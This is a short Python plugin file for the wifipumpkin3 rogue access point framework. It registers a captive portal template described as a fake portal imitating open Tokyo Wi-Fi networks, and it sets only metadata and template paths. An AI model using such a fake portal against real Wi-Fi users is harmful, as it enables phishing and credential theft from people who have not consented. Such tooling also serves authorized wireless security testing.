from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C


class FlaskTokyo(CaptiveTemplatePlugin):
    meta = {
        "Name": "FlaskTokyo",
        "Version": "0.5",
        "Description": "A fake captive portal based on open wireless access points in Tokyo.",
        "Author": "@zer0-ne, @y9k8i",
        "TemplatePath": C.TEMPLATES_FLASK + "templates/FlaskTokyo",
        "StaticPath": C.TEMPLATES_FLASK + "templates/FlaskTokyo/static",
        "Preview": "plugins/captivePortal/templates/FlaskTokyo/preview.png",
    }

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value
        self.dict_domain = {}
        self.ConfigParser = False
